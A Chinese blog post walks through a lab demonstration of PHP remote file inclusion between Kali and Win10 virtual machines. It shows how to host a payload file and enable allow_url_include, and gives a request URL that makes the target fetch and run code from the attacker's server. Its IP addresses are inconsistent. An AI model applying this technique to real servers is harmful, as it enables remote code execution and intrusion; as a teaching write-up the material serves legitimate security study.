---
link: https://blog.csdn.net/2403_88102829/article/details/153182370
title: REI——远程文件包含
description: 以 PHP 远程文件包含为例，梳理环境配置、远程文件加载与代码执行验证过程，并总结漏洞成因、利用条件和风险边界。
excerpt: 以 PHP 远程文件包含为例，梳理环境配置、远程文件加载与代码执行验证过程，并总结漏洞成因、利用条件和风险边界。
keywords: REI——远程文件包含
author: Lee
date: 2025-10-29T00:13:13.243Z
categories:
  - 漏洞研究
tags:
  - Web安全
  - 文件包含
  - 远程代码执行
---

<meta name="referrer"content="no-referrer"/>

REI——Remote File Inclusion

本次实验用到两台虚拟机——kali和win10

漏洞本质：攻击者通过包含恶意远程文件，在目标服务器上执行任意代码

攻击效果：远程代码执行，提权，敏感数据

分析一下环境：

kali192.168.145.128攻击机win10192.168.36.128靶机

先ping一下网络连通性

![](https://i-blog.csdnimg.cn/direct/5545f9d5aa5942f0847bd3ec8bde9513.png)

通了，下一步我们实施远程文件包含攻击

首先在kali上启动web服务，并且准备一下我们的攻击文件

```
#打开apache
sudo systemctl start apache2

#创建需要的文件
sudo nano /var/www/html/gj.txt
```

![](https://i-blog.csdnimg.cn/direct/f55c38969361444bae1ccede266d52a8.png)

ctrl-x→Y→Enter保存，我们再查看一下，保存成功可访问

![](https://i-blog.csdnimg.cn/direct/e5340092ad5749fbb3caf07f887d7eb5.png)

在里面写入所需的php代码，然后ctrl-x→y→Enter保存，再用curl查看一下是否能成功访问

![](https://i-blog.csdnimg.cn/direct/ffd902a061d14a1eb45b5d149fb1b8a3.png)Win10:

启动phpstudy_pro里面的apache

并且确保win10中php.in配置中的参数为

**allow_url_include=On,allow_url_fopen=On**，使得win10中pphp安全配置允许远程文件包含

![](https://i-blog.csdnimg.cn/direct/9a137e4aeba540eaa5f01c07ea108b7d.png)

然后实施RFI攻击

在kali的浏览器里面访问

http://192.168.145.128/vuln.php?page=http://192.168.145.131/gj.txt

![](https://i-blog.csdnimg.cn/direct/5ba3b131d0294f4ab79467536e6896c4.png)

执行成功
